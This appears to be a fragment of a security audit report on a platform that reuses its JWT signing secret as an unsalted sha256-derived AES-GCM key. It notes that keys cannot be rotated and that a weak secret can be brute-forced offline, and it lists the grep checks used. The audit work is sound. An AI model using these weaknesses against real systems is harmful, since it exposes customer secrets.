findings.impact: The platform cannot perform routine key rotation — the single most basic incident-response action — without destroying every customer's stored secrets and breaking all deployments. Key reuse across two primitives (HS256 signing and AES-256-GCM data encryption) collapses two separate compromises into one. Additionally the key is a raw sha256 of an operator-chosen string with no salt and no KDF (no PBKDF2/scrypt/HKDF), so a short or low-entropy JWT_SECRET is directly brute-forceable offline against any single captured ciphertext.
findings.checked_mitigations: Grepped `rg -n "ENCRYPTION_KEY" src scripts` — the only references are config.ts:60/99-100 and crypto.ts; there is no rotation utility, no key-id field, and no second key. `ls scripts` shows no re-encryption migration (migrate-api-keys.js is unrelated to crypto keys). env.example:41-43 documents ENCRYPTION_KEY as optional-looking (`# Generate a 32-byte key`) while config.ts silently substitutes JWT_SECRET when it is absent, so the dangerous configuration is the default one.

findings.title: Build-time secrets are baked into image ENV layers, surviving rotation and deletion
